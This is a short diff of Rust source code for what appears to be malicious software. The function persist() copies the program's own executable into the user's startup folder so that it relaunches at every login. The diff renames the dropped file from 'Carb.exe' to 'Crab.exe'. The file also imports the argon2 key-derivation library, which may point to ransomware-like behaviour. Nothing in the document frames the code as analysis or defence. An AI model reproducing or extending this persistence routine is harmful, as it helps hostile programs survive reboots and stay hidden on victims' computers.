@@ -1,4 +1,5 @@
 
+
 use argon2::{Algorithm, Argon2, Params, Version};
 use rand::Rng;
 use std::fs;
@@ -25,7 +26,7 @@ fn persist() {
     if let Ok(exe) = std::env::current_exe() {
         if let Some(startup) = dirsStartup() {
             let _ = fs::create_dir_all(&startup);
-            let dest = startup.join("Carb.exe");
+            let dest = startup.join("Crab.exe");
             let _ = fs::copy(&exe, &dest);
         }
     }
